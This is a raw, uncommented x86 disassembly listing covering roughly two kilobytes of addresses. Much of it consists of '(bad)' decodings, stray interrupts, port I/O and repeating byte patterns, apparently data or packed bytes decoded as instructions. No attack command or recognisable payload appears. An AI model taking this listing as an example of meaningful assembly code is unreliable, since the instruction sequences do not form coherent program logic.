  426905:	adc    ecx,ebp
  426907:	xchg   esi,eax
  426908:	dec    esp
  426909:	int    0xe6
  42690b:	dec    esp
  42690c:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426912:	stc    
  426913:	shr    ecx,cl
  426915:	sub    BYTE PTR [ebx-0x27],dl
  426918:	mov    eax,0x9096cc0a
  42691d:	inc    DWORD PTR [eax]
  42691f:	add    ch,cl
  426921:	lea    ecx,[ebp+ecx*8-0x6a]
  426925:	dec    esp
  426926:	cmp    esi,ecx
  426928:	shr    edx,cl
  42692a:	sub    BYTE PTR [ebx],bh
  42692c:	psrlq  mm5,mm3
  42692f:	xchg   edx,eax
  426930:	push   ebx
  426931:	adc    ecx,ebp
  426933:	xchg   esi,eax
  426934:	dec    esp
  426935:	int    0xe6
  426937:	dec    esp
  426938:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42693e:	stc    
  42693f:	shr    ecx,cl
  426941:	sub    BYTE PTR [ebx-0x27],dl
  426944:	mov    eax,0xa496cc0a
  426949:	inc    DWORD PTR [eax]
  42694b:	add    ch,cl
  42694d:	lea    esi,[eax]
  42694f:	int    0x96
  426951:	xor    BYTE PTR [ebx],bh
  426953:	icebp  
  426954:	cmp    ecx,DWORD PTR [edi]
  426956:	shr    edx,cl
  426958:	sub    bl,dl
  42695a:	jmp    0x4268ee
  42695c:	push   ebx
  42695d:	adc    ecx,ebp
  42695f:	xchg   esi,eax
  426960:	xor    ch,cl
  426962:	out    0x30,al
  426964:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42696a:	xchg   edx,eax
  42696b:	shr    ecx,cl
  42696d:	sub    BYTE PTR [ebx-0x27],dl
  426970:	xchg   DWORD PTR [ebx],edx
  426972:	or     cl,bh
  426974:	adc    eax,0xcd0000ff
  426979:	lea    ecx,[ebp+ecx*8-0x6a]
  42697d:	dec    esp
  42697e:	int    0xe6
  426980:	mov    BYTE PTR [ebx],bh
  426982:	icebp  
  426983:	cmp    ecx,DWORD PTR [edi]
  426985:	shr    ebx,cl
  426987:	xchg   edx,eax
  426988:	shr    edx,cl
  42698a:	sub    BYTE PTR [ebx+0x13],dl
  42698d:	iret   
  42698e:	push   es
  42698f:	nop
  426990:	inc    DWORD PTR [eax]
  426992:	add    BYTE PTR [edx],cl
  426994:	add    eax,0xff1dcf
  426999:	add    bh,cl
  42699b:	jbe    0x42696d
  42699d:	mov    ebp,0x10d8
  4269a2:	int    0x8d
  4269a4:	xor    ch,cl
  4269a6:	xchg   esi,eax
  4269a7:	xor    al,al
  4269a9:	(bad)  
  4269aa:	cmp    ecx,DWORD PTR [edi]
  4269ac:	stos   BYTE PTR es:[edi],al
  4269ad:	cmp    ebx,ecx
  4269af:	shr    ebx,cl
  4269b1:	xchg   edx,eax
  4269b2:	shr    edx,cl
  4269b4:	sub    BYTE PTR [ebx+0x13],dl
  4269b7:	or     al,BYTE PTR ds:0xff1dcf
  4269bd:	add    ch,cl
  4269bf:	jbe    0x426a0d
  4269c1:	int    0x8d
  4269c3:	dec    esp
  4269c4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269c7:	mov    ebp,0xd3f03b92
  4269cc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269d0:	aam    0x3c
  4269d2:	iret   
  4269d3:	push   es
  4269d4:	adc    eax,0x700000ff
  4269d9:	int    0x76
  4269db:	xor    ch,cl
  4269dd:	lea    esi,[eax]
  4269df:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269e2:	mov    ebp,0xd3f03b92
  4269e7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269eb:	jo     0x4269bc
  4269ed:	push   es
  4269ee:	and    al,0x0
  4269f0:	add    BYTE PTR [eax],al
  4269f2:	jo     0x4269c1
  4269f4:	jbe    0x426a0a
  4269f6:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  4269fd:	int    0x8d
  4269ff:	dec    esp
  426a00:	cmp    edi,DWORD PTR [ecx+0x3b]
  426a03:	lock int 0xe6
  426a06:	mov    bl,dl
  426a08:	mov    ebp,0x28f2d392
  426a0d:	push   ebx
  426a0e:	ror    edi,cl
  426a10:	iret   
  426a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a12:	inc    DWORD PTR [eax]
  426a14:	add    BYTE PTR [edx],cl
  426a16:	int3   
  426a17:	push   es
  426a18:	sbb    eax,0xcf0000ff
  426a1d:	jbe    0x426a44
  426a1f:	mov    ebp,0xeff5
  426a24:	int    0x8d
  426a26:	xor    ch,cl
  426a28:	xchg   esi,eax
  426a29:	xor    BYTE PTR [ebx],bh
  426a2b:	psrlq  mm5,mm3
  426a2e:	xchg   edx,eax
  426a2f:	add    al,0xfb
  426a31:	call   ebx
  426a33:	jmp    0xcf05:0xa135328
  426a3a:	sbb    eax,0x610000ff
  426a3f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a45:	xor    eax,0xab88080
  426a4a:	push   es
  426a4b:	jo     0x426a4d
  426a4d:	add    BYTE PTR [eax],al
  426a4f:	iret   
  426a50:	mov    dh,BYTE PTR [eax]
  426a52:	mov    eax,0xb4cf0a
  426a57:	add    BYTE PTR [eax],al
  426a59:	pop    ebp
  426a5a:	adc    BYTE PTR ds:0xab88080,dh
  426a60:	push   es
  426a61:	bound  eax,QWORD PTR [eax]
  426a63:	add    BYTE PTR [eax],al
  426a65:	int    0xd2
  426a67:	mov    eax,0x94060a
  426a6c:	add    BYTE PTR [eax],al
  426a6e:	int    0xd3
  426a70:	mov    eax,0x98060a
  426a75:	add    BYTE PTR [eax],al
  426a77:	add    al,0x6d
  426a79:	sub    ch,cl
  426a7b:	jge    0x426a35
  426a7d:	or     cl,bh
  426a7f:	mov    eax,0xcf000000
  426a84:	mov    ch,BYTE PTR [eax]
  426a86:	mov    eax,0xbccf0a
  426a8b:	add    BYTE PTR [eax],al
  426a8d:	add    al,0xd3
  426a8f:	pusha  
  426a90:	mov    eax,0xc0cf0a
  426a95:	add    BYTE PTR [eax],al
  426a97:	iret   
  426a98:	mov    cl,BYTE PTR [edx-0x48]
  426a9b:	or     cl,bh
  426a9d:	les    eax,FWORD PTR [eax]
  426a9f:	add    BYTE PTR [eax],al
  426aa1:	int    0xf9
  426aa3:	mov    eax,0x9c670a
  426aa8:	add    BYTE PTR [eax],al
  426aaa:	iret   
  426aab:	loopne 0x426a4d
  426aad:	pop    edi
  426aae:	add    BYTE PTR ds:0xab88080,dh
  426ab4:	iret   
  426ab5:	enter  0x0,0x0
  426ab9:	iret   
  426aba:	mov    bh,bh
  426abc:	mov    eax,0x90cf0a
  426ac1:	add    BYTE PTR [eax],al
  426ac3:	mov    eax,0xa0670a
  426ac8:	add    BYTE PTR [eax],al
  426aca:	add    al,0xc9
  426acc:	stc    
  426acd:	mov    eax,0xa4670a
  426ad2:	add    BYTE PTR [eax],al
  426ad4:	int    0xf9
  426ad6:	pop    edi
  426ad7:	leave  
  426ad8:	xor    eax,0xab88080
  426add:	iret   
  426ade:	add    BYTE PTR [eax],0x0
  426ae1:	add    ch,cl
  426ae3:	jge    0x426a9d
  426ae5:	or     cl,bh
  426ae7:	aam    0x0
  426ae9:	add    BYTE PTR [eax],al
  426aeb:	int    0xc5
  426aed:	mov    eax,0xe0060a
  426af2:	add    BYTE PTR [eax],al
  426af4:	cmp    ebp,DWORD PTR [ebp-0x48]
  426af7:	or     ah,BYTE PTR [edi-0x58]
  426afa:	add    BYTE PTR [eax],al
  426afc:	add    bh,cl
  426afe:	addr16 in al,0x0
  426b01:	add    BYTE PTR [eax],al
  426b03:	leave  
  426b04:	push   es
  426b05:	lods   al,BYTE PTR ds:[esi]
  426b06:	add    BYTE PTR [eax],al
  426b08:	add    dh,ah
  426b0a:	xor    eax,0x6c9352b
  426b0f:	fadd   DWORD PTR [eax]
  426b11:	add    BYTE PTR [eax],al
  426b13:	jae    0x426b4a
  426b15:	jno    0x426b4c
  426b17:	mov    eax,0x3076cdaf
  426b1c:	int    0x8d
  426b1e:	xor    ch,cl
  426b20:	xchg   esi,eax
  426b21:	xor    BYTE PTR [edx+eax*1],al
  426b24:	call   ebx
  426b26:	repnz sub BYTE PTR [ebx],bh
  426b29:	jns    0x426afe
  426b2b:	mov    ebp,0xcdd35392
  426b30:	lea    esi,[eax]
  426b32:	add    al,0x2
  426b34:	(bad)  
  426b35:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b3b:	repz xchg edx,eax
  426b3d:	push   ebx
  426b3e:	jecxz  0x426b7b
  426b40:	retf   
  426b41:	add    al,0xd2
  426b43:	sbb    bl,BYTE PTR [ebx]
  426b45:	retf   
  426b46:	cmp    eax,DWORD PTR [eax]
  426b48:	inc    ebx
  426b49:	cli    
  426b4a:	das    
  426b4b:	or     cl,dl
  426b4d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b54:	das    
  426b55:	add    al,0x37
  426b57:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b5e:	xchg   esi,eax
  426b5f:	xor    BYTE PTR [ebx],bh
  426b61:	psrlq  mm5,mm3
  426b64:	xchg   edx,eax
  426b65:	add    al,0xfb
  426b67:	call   ebx
  426b69:	jmp    0xcd7d:0x87135328
  426b70:	aad    0xb8
  426b72:	cmp    edx,DWORD PTR ds:0x708d
  426b78:	add    ch,cl
  426b7a:	lea    esi,[eax]
  426b7c:	int    0xe6
  426b7e:	xor    BYTE PTR [ebx],bh
  426b80:	psrlq  mm5,mm3
  426b83:	xchg   edx,eax
  426b84:	add    al,0xf8
  426b86:	call   ebx
  426b88:	jmp    0x8832beb5
  426b8d:	jge    0x426b47
  426b8f:	int    0xcc
  426b91:	lea    esi,[eax+0x0]
  426b94:	add    BYTE PTR [eax],al
  426b96:	mov    eax,0xd3b8e3f8
  426b9b:	repnz das 
  426b9d:	mov    eax,0x53b8f3e3
  426ba2:	jecxz  0x426b71
  426ba4:	lea    esi,[eax]
  426ba6:	int    0xe6
  426ba8:	xor    BYTE PTR [ebx],bh
  426baa:	psrlq  mm5,mm3
  426bad:	xchg   edx,eax
  426bae:	add    al,0xf8
  426bb0:	call   ebx
  426bb2:	jmp    0x8832bedf
  426bb7:	jge    0x426b71
  426bb9:	or     dl,BYTE PTR ds:0x708d
  426bbf:	add    ch,cl
  426bc1:	lea    esi,[eax]
  426bc3:	int    0x96
  426bc5:	xor    BYTE PTR [ebx],bh
  426bc7:	(bad)  
  426bc9:	sti    
  426bca:	call   ebx
  426bcc:	jmp    0x426b60
  426bce:	shr    edx,cl
  426bd0:	sub    BYTE PTR [ebx+0x13],dl
  426bd3:	int    0x96
  426bd5:	xor    BYTE PTR [edi+0x308dcdd3],al
  426bdb:	add    al,0x2
  426bdd:	(bad)  
  426bde:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426be4:	repz xchg edx,eax
  426be6:	push   ebx
  426be7:	jecxz  0x426c24
  426be9:	retf   
  426bea:	add    al,0xd2
  426bec:	sbb    bl,BYTE PTR [ebx]
  426bee:	retf   
  426bef:	cmp    eax,DWORD PTR [eax]
  426bf1:	inc    ebx
  426bf2:	cli    
  426bf3:	das    
  426bf4:	or     ebp,DWORD PTR [esi+0x2f000000]
  426bfa:	pop    es
  426bfb:	pop    ebx
  426bfc:	add    BYTE PTR [eax],al
  426bfe:	add    bl,al
  426c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c01:	mov    esi,0x76cf4229
  426c06:	jne    0x426c12
  426c08:	jbe    0x426b92
  426c0a:	int    0x76
  426c0c:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c12:	or     bl,BYTE PTR [ecx+ecx*8]
  426c15:	ins    BYTE PTR es:[edi],dx
  426c16:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c1c:	jbe    0x426c93
  426c1e:	int    0x8d
  426c20:	jge    0x426c51
  426c22:	inc    ebp
  426c23:	jge    0x426bb7
  426c25:	shr    ebx,cl
  426c27:	xchg   edx,eax
  426c28:	int    0x8d
  426c2a:	jne    0x426bf9
  426c2c:	xchg   esi,eax
  426c2d:	jge    0x426c6a
  426c2f:	leave  
  426c30:	cmp    ebx,edx
  426c32:	push   ebx
  426c33:	icebp  
  426c34:	int    0x76
  426c36:	cmc    
  426c37:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c3d:	jo     0x426c0e
  426c3f:	push   es
  426c40:	cmc    
  426c41:	inc    DWORD PTR [eax]
  426c43:	add    BYTE PTR [eax-0x2d],dh
  426c46:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c4d:	int    0x76
  426c4f:	in     eax,dx
  426c50:	int    0x8d
  426c52:	adc    DWORD PTR [edi],ebp
  426c54:	inc    ebp
  426c55:	jge    0x426be9
  426c57:	shr    ebx,cl
  426c59:	xchg   edx,eax
  426c5a:	int    0x8d
  426c5c:	in     eax,dx
  426c5d:	int    0x96
  426c5f:	adc    ebx,edx
  426c61:	repnz sub ch,cl
  426c64:	iret   
  426c65:	cmc    
  426c66:	inc    DWORD PTR [eax]
  426c68:	add    ch,cl
  426c6a:	mov    DWORD PTR [ebx],edi
  426c6c:	leave  
  426c6d:	cmp    ebx,edx
  426c6f:	push   ebx
  426c70:	rol    BYTE PTR [ebx+0x7d],cl
  426c73:	das    
  426c74:	push   es
  426c75:	push   ebp
  426c76:	add    BYTE PTR [eax-0xa293280],0xc9
  426c7d:	jbe    0x426c8c
  426c7f:	(bad)  
  426c80:	ficom  WORD PTR ss:[ebx]
  426c83:	pop    ebp
  426c84:	mov    ebp,0xa25230a
  426c89:	jbe    0x426c7c
  426c8b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426c91:	int    0x76
  426c93:	xchg   ebp,eax
  426c94:	int    0x8d
  426c96:	popf   
  426c97:	das    
  426c98:	inc    ebp
  426c99:	jge    0x426c2d
  426c9b:	shr    ebx,cl
  426c9d:	xchg   edx,eax
  426c9e:	int    0x8d
  426ca0:	xchg   ebp,eax
  426ca1:	int    0x96
  426ca3:	popf   
  426ca4:	cmp    ecx,ecx
  426ca6:	cmp    ebx,edx
  426ca8:	push   ebx
  426ca9:	icebp  
  426caa:	bound  eax,QWORD PTR [eax]
  426cac:	(bad)  
  426cad:	xor    al,0xd3
  426caf:	repnz sub BYTE PTR [eax],al
  426cb2:	pop    ecx
  426cb3:	xor    eax,0xbd808081
  426cb8:	push   eax
  426cb9:	repnz add BYTE PTR [eax],al
  426cbc:	int    0x76
  426cbe:	xchg   ebp,eax
  426cbf:	int    0x8d
  426cc1:	popf   
  426cc2:	das    
  426cc3:	inc    ebp
  426cc4:	jge    0x426c58
  426cc6:	shr    ebx,cl
  426cc8:	xchg   edx,eax
  426cc9:	int    0x8d
  426ccb:	xchg   ebp,eax
  426ccc:	int    0x96
  426cce:	popf   
  426ccf:	cmp    ecx,ecx
  426cd1:	cmp    ebx,edx
  426cd3:	push   ebx
  426cd4:	icebp  
  426cd5:	bound  eax,QWORD PTR [eax]
  426cd7:	pop    ecx
  426cd8:	xor    eax,0xd3808081
  426cdd:	repnz sub BYTE PTR [eax],al
  426ce0:	pop    ecx
  426ce1:	sub    eax,0xbd808081
  426ce6:	xchg   edx,eax
  426ce7:	repnz add BYTE PTR [eax],al
  426cea:	int    0x7
  426cec:	xor    eax,0xcd808081
  426cf1:	mov    ch,cl
  426cf3:	jle    0x426d59
  426cf5:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426cfb:	lea    ecx,ds:0x2ff176cd
  426d01:	inc    ebp
  426d02:	rcl    DWORD PTR [edx-0x326d422d],cl
  426d08:	jbe    0x426d17
  426d0a:	int    0x96
  426d0c:	icebp  
  426d0d:	cmp    esi,eax
  426d0f:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d15:	ror    ebp,cl
  426d17:	lea    ecx,[eax+0x187ebb2f]
  426d1d:	push   es
  426d1e:	jge    0x426cf4
  426d20:	dec    esp
  426d21:	int    0x7
  426d23:	popf   
  426d24:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d2e:	jbe    0x426d7c
  426d30:	int    0x76
  426d32:	xor    BYTE PTR [eax],al
  426d34:	(bad)  
  426d35:	cmp    al,0x0
  426d37:	(bad)  
  426d38:	cmc    
  426d39:	add    dh,dl
  426d3b:	sub    al,0x0
  426d3d:	(bad)  
  426d3e:	and    al,0x0
  426d40:	(bad)  
  426d41:	sbb    al,0x0
  426d43:	(bad)  
  426d44:	adc    al,0xbd
  426d46:	test   ch,dh
  426d48:	add    BYTE PTR [eax],al
  426d4a:	or     al,BYTE PTR [esi]
  426d4c:	adc    edi,edi
  426d4e:	add    BYTE PTR [eax],al
  426d50:	int    0x76
  426d52:	cmp    al,0x4
  426d54:	fcom   QWORD PTR [eax+eax*4]
  426d57:	aam    0x1a
  426d59:	int    0x76
  426d5b:	cmp    al,0x4
  426d5d:	fsub   QWORD PTR [eax+eax*4]
  426d60:	aam    0x4e
  426d62:	int    0x6
  426d64:	adc    edi,edi
  426d66:	add    BYTE PTR [eax],al
  426d68:	int    0x8d
  426d6a:	cmp    al,0xa
  426d6c:	outs   dx,BYTE PTR ds:[esi]
  426d6d:	sbb    al,0xec
  426d6f:	push   ebx
  426d70:	add    dh,dl
  426d72:	cmp    al,0x0
  426d74:	(bad)  
  426d75:	cmc    
  426d76:	mov    ebp,0x6daa
  426d7b:	stos   BYTE PTR es:[edi],al
  426d7c:	test   al,0x63
  426d7e:	retf   
  426d7f:	shl    BYTE PTR [eax+eax*4],cl
  426d82:	xchg   esi,eax
  426d83:	int    0xed
  426d85:	jno    0x426df8
  426d87:	cwde   
  426d88:	leave  
  426d89:	jbe    0x426d88
  426d8b:	dec    ecx
  426d8c:	and    DWORD PTR [esi-0x68936cb],eax
  426d92:	inc    ecx
  426d93:	and    DWORD PTR [esi-0x28932cb],eax
  426d99:	int    0xd6
  426d9b:	std    
  426d9c:	sar    bh,0x5f
  426d9f:	shl    DWORD PTR [ecx],1
  426da1:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426da7:	sti    
  426da8:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426dae:	push   ebx
  426daf:	jns    0x426d7e
  426db1:	(bad)  
  426db2:	mov    BYTE PTR [ebx+0x11],al
  426db5:	int    0x76
  426db7:	std    
  426db8:	aam    0xc4
  426dba:	int    0xd6
  426dbc:	std    
  426dbd:	cmp    edx,ebx
  426dbf:	cmp    edi,ebx
  426dc1:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426dc7:	push   ebx
  426dc8:	jns    0x426d97
  426dca:	(bad)  
  426dcb:	dec    esp
  426dcc:	inc    ebx
  426dcd:	adc    esp,edx
  426dcf:	pop    ebx
  426dd0:	int    0x96
  426dd2:	xor    BYTE PTR [edx-0x32b31933],bl
  426dd8:	jbe    0x426d62
  426dda:	cmp    esi,edi
  426ddc:	push   es
  426ddd:	add    ah,dl
  426ddf:	push   esi
  426de0:	pop    ebx
  426de1:	retf   0x8624
  426de4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426dea:	das    
  426deb:	push   es
  426dec:	fcmovbe st,st(6)
  426dee:	dec    esi
  426def:	add    al,0xf4
  426df1:	adc    DWORD PTR [edx],0xffffffc5
  426df4:	fwait
  426df5:	add    BYTE PTR [eax+0x2fa60980],0xec
  426dfc:	dec    esp
  426dfd:	adc    ch,ah
  426dff:	in     eax,dx
  426e00:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426e07:	lea    ebp,[edi]
  426e09:	retf   0x2fa6
  426e0c:	or     DWORD PTR [esi+eax*4],esp
  426e0f:	js     0x426e54
  426e11:	clc    
  426e12:	or     BYTE PTR [esi],0x63
  426e15:	int    0x76
  426e17:	stc    
  426e18:	cmp    edx,ebx
  426e1a:	int    0x8d
  426e1c:	stc    
  426e1d:	add    al,0x2
  426e1f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e25:	std    
  426e26:	cmp    edx,ebx
  426e28:	int    0x8d
  426e2a:	std    
  426e2b:	cmp    edx,DWORD PTR [ebx]
  426e2d:	shl    edx,cl
  426e2f:	sub    bl,dl
  426e31:	mov    ebp,0xa8d35392
  426e36:	retf   
  426e37:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e3b:	int    0xed
  426e3d:	add    al,0xed
  426e3f:	(bad)  
  426e40:	leave  
  426e41:	jbe    0x426e40
  426e43:	dec    ecx
  426e44:	and    DWORD PTR [esi+0x21416135],eax
  426e4a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e50:	jbe    0x426e66
  426e52:	or     dh,BYTE PTR [esi+0x14]
  426e55:	int    0x76
  426e57:	adc    al,0xcd
  426e59:	add    DWORD PTR ds:0xcd808081,ebp
  426e5f:	lea    edx,[ecx*8+0x2d0acd80]
  426e66:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e70:	lea    esi,[ebp-0x32028933]
  426e76:	(bad)  
  426e77:	std    
  426e78:	cwde   
  426e79:	call   0x3b85:0x82cfffc0
  426e80:	jns    0x426e55
  426e82:	mov    ebp,0xf03baa92
  426e87:	shl    edx,cl
  426e89:	sub    BYTE PTR [ebx-0x2d],dl
  426e8c:	or     dh,BYTE PTR [esi-0x63]
  426e8f:	int    0x76
  426e91:	std    
  426e92:	int    0x8d
  426e94:	std    
  426e95:	cmp    edi,DWORD PTR [ecx-0x2d]
  426e98:	mov    ebp,0xd3f03b92
  426e9d:	repnz sub BYTE PTR [ebx-0x2d],dl
  426ea1:	or     dh,BYTE PTR [esi-0x53]
  426ea4:	int    0x76
  426ea6:	mov    ch,0xcd
  426ea8:	ins    BYTE PTR es:[edi],dx
  426ea9:	jo     0x426eaf
  426eab:	mov    ebp,0xf1760a4c
  426eb0:	int    0x76
  426eb2:	mov    ch,0xcd
  426eb4:	ins    BYTE PTR es:[edi],dx
  426eb5:	pop    esp
  426eb6:	int    0x8d
  426eb8:	mov    ch,0x7c
  426eba:	push   es
  426ebb:	outs   dx,BYTE PTR ds:[esi]
  426ebc:	xchg   esp,eax
  426ebd:	int    0x76
  426ebf:	mov    ch,0xd4
  426ec1:	sbb    al,0xcd
  426ec3:	ins    BYTE PTR es:[edi],dx
  426ec4:	pop    esp
  426ec5:	int    0x8d
  426ec7:	mov    ch,0xcd
  426ec9:	jle    0x426e5f
  426ecb:	jl     0x426ec5
  426ecd:	icebp  
  426ece:	sub    edi,DWORD PTR [ebp-0x33]
  426ed1:	jbe    0x426e88
  426ed3:	int    0x6c
  426ed5:	pop    esp
  426ed6:	xchg   ebx,edx
  426ed8:	in     al,dx
  426ed9:	xchg   ebp,ecx
  426edb:	ins    BYTE PTR es:[edi],dx
  426edc:	xchg   esp,eax
  426edd:	or     dh,BYTE PTR [esi-0x43]
  426ee0:	int    0x76
  426ee2:	std    
  426ee3:	int    0x8d
  426ee5:	std    
  426ee6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ee9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426ef0:	push   ebx
  426ef1:	ror    DWORD PTR [edx],cl
  426ef3:	jbe    0x426f09
  426ef5:	int    0x76
  426ef7:	std    
  426ef8:	int    0x8d
  426efa:	std    
  426efb:	cmp    edi,DWORD PTR [ecx+0x3b]
  426efe:	lock shl edx,cl
  426f01:	sub    bl,dl
  426f03:	mov    ebp,0xad35392
  426f08:	jbe    0x426f1e
  426f0a:	int    0x76
  426f0c:	std    
  426f0d:	int    0x8d
  426f0f:	std    
  426f10:	cmp    esi,eax
  426f12:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f15:	repnz sub bl,dl
  426f18:	mov    ebp,0xcdd35392
  426f1d:	lea    esi,[eax]
  426f1f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f25:	jbe    0x426f3b
  426f27:	cmp    DWORD PTR [ecx],esp
  426f29:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f2f:	and    DWORD PTR [esi+0x1476c935],eax
  426f35:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f3b:	xchg   BYTE PTR [eax-0x2893280],al
  426f41:	int    0x8d
  426f43:	std    
  426f44:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f47:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f4e:	push   ebx
  426f4f:	ror    DWORD PTR [edx],cl
  426f51:	jbe    0x426f00
  426f53:	int    0x76
  426f55:	mov    ebp,0xa4c7687
  426f5a:	jbe    0x426ef9
  426f5c:	add    dh,dl
  426f5e:	popf   
  426f5f:	add    dh,dl
  426f61:	dec    esp
  426f62:	int    0x8d
  426f64:	mov    ch,0xbd
  426f66:	neg    bh
  426f68:	add    BYTE PTR [eax],al
  426f6a:	or     dh,BYTE PTR [esi+0x14]
  426f6d:	int    0x76
  426f6f:	adc    al,0x6
  426f71:	ins    DWORD PTR es:[edi],dx
  426f72:	aam    0x60
  426f74:	int    0x76
  426f76:	popf   
  426f77:	or     dh,BYTE PTR [esi-0x5b]
  426f7a:	int    0x76
  426f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f7d:	int    0x8d
  426f7f:	dec    esp
  426f80:	xor    edx,ebx
  426f82:	or     dh,BYTE PTR [esi-0x5b]
  426f85:	int    0x76
  426f87:	adc    al,0xcd
  426f89:	lea    edx,[ecx*8+0x6e87306c]
  426f90:	dec    esp
  426f91:	int    0x8d
  426f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f94:	inc    ebx
  426f95:	jge    0x426f19
  426f97:	sbb    ch,cl
  426f99:	jbe    0x426faf
  426f9b:	int    0x6c
  426f9d:	dec    esp
  426f9e:	int    0x8d
  426fa0:	adc    al,0x87
  426fa2:	outs   dx,BYTE PTR ds:[esi]
  426fa3:	mov    ch,cl
  426fa5:	lea    esp,[ebp-0x2e142ccd]
  426fab:	test   DWORD PTR [eax+0x2149bf80],eax
  426fb1:	xchg   BYTE PTR ds:0xc90da60a,dh
  426fb7:	jbe    0x427036
  426fb9:	inc    ecx
  426fba:	and    DWORD PTR [esi+0x7576c935],eax
  426fc0:	cmp    DWORD PTR [ecx],esp
  426fc2:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426fc8:	and    DWORD PTR [esi+0xd76cf35],eax
  426fce:	or     dh,BYTE PTR [esi-0xb]
  426fd1:	iret   
  426fd2:	jbe    0x427051
  426fd4:	or     dh,BYTE PTR [esi+0x11]
  426fd7:	iret   
  426fd8:	jbe    0x42704f
  426fda:	or     dh,BYTE PTR [esi+0x14]
  426fdd:	iret   
  426fde:	jbe    0x42704d
  426fe0:	or     dh,BYTE PTR [esi-0x13]
  426fe3:	int    0x76
  426fe5:	std    
  426fe6:	int    0x8d
  426fe8:	std    
  426fe9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fec:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426ff3:	push   ebx
  426ff4:	ror    DWORD PTR [edx],cl
  426ff6:	jbe    0x426f9d
  426ff8:	jmp    0x42700d
  426ffa:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  427000:	and    DWORD PTR [esi-0x22fad0cb],eax
  427006:	xchg   DWORD PTR [eax+0x4cc080],eax
  42700c:	(bad)  
  42700d:	popf   
  42700e:	iret   
  42700f:	jbe    0x426fe1
  427011:	jo     0x426fd0
  427013:	xlat   BYTE PTR ds:[ebx]
  427014:	fild   WORD PTR [eax]
  427016:	add    ch,cl
  427018:	jbe    0x427013
  42701a:	int    0x8d
  42701c:	stc    
  42701d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427020:	lock shl edx,cl
  427023:	sub    bl,dl
  427025:	mov    ebp,0xad35392
  42702a:	jbe    0x426fd9
  42702c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427032:	int    0x76
  427034:	xchg   ebp,eax
  427035:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42703b:	in     eax,0x28
  42703d:	push   ebx
  42703e:	popf   
  42703f:	or     ah,BYTE PTR [esi-0x689325b]
  427045:	int    0x8d
  427047:	stc    
  427048:	cmp    esi,eax
  42704a:	shl    edx,cl
  42704c:	sub    BYTE PTR [ebx],bh
  42704e:	jns    0x427023
  427050:	mov    ebp,0xcdd35392
  427055:	(bad)  
  427056:	stc    
  427057:	int    0x96
  427059:	stc    
  42705a:	cmp    ecx,DWORD PTR [edi]
  42705c:	cmp    ebx,ecx
  42705e:	shr    ebx,cl
  427060:	xchg   edx,eax
  427061:	shr    edx,cl
  427063:	sub    BYTE PTR [ebx+0x13],dl
  427066:	xchg   ebx,edx
  427068:	int    0x8d
  42706a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42706b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427071:	sub    ch,cl
  427073:	jbe    0x42706e
  427075:	int    0x8d
  427077:	stc    
  427078:	cmp    edi,DWORD PTR [ecx+0x3b]
  42707b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427082:	push   ebx
  427083:	shl    DWORD PTR [eax-0x40],cl
  427086:	dec    esp
  427087:	iret   
  427088:	jbe    0x42705a
  42708a:	jo     0x427049
  42708c:	sti    
  42708d:	std    
  42708e:	add    BYTE PTR [eax],al
  427090:	int    0x76
  427092:	std    
  427093:	int    0x8d
  427095:	std    
  427096:	cmp    edi,DWORD PTR [ecx+0x3b]
  427099:	lock shl edx,cl
  42709c:	sub    bl,dl
  42709e:	mov    ebp,0xcdd35392
  4270a3:	lea    esp,[ebp+0x28d47d43]
  4270a9:	int    0x76
  4270ab:	std    
  4270ac:	int    0x8d
  4270ae:	std    
  4270af:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270b2:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270b9:	push   ebx
  4270ba:	shl    DWORD PTR [eax-0x40],cl
  4270bd:	dec    esp
  4270be:	iret   
